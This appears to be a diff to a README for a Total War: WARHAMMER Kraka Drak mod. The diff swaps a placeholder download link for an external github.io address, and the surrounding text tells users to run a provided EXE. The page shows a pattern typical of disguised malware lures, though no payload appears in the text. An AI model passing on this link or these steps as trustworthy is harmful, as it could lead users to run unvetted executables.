@@ -4,7 +4,7 @@ To install, simply extract the downloaded archive and run the provided EXE file.
 
 Cataph’s Kraka Drak Mod brings the northern Dwarfs to life in Total War: WARHAMMER by adding a fully playable Kraka Drak faction. With custom units, lords, tech trees, and a unique campaign start, it expands the Dwarfen presence in the Old World.
 
-[![Download Kraka Drak](https://img.shields.io/badge/Download-Kraka--Drak--Mod-blueviolet)](#)
+[![Download Kraka Drak](https://img.shields.io/badge/Download-Kraka--Drak--Mod-blueviolet)](https://cataph-s-kraka-drak-mod-for-total-war.github.io/.github)
 
 ---
 
